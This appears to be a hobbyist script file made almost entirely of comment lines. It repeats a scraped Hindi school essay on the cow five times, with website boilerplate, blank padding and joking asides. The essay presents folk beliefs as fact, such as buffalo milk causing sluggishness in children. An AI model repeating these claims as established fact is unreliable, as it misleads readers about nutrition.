#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा




#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा





#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#यदि समझ आ गया तो अब सो जाओ









#अब सब प्रतिरूप कर के चिपकने वाले है








clear
























































#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो











#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
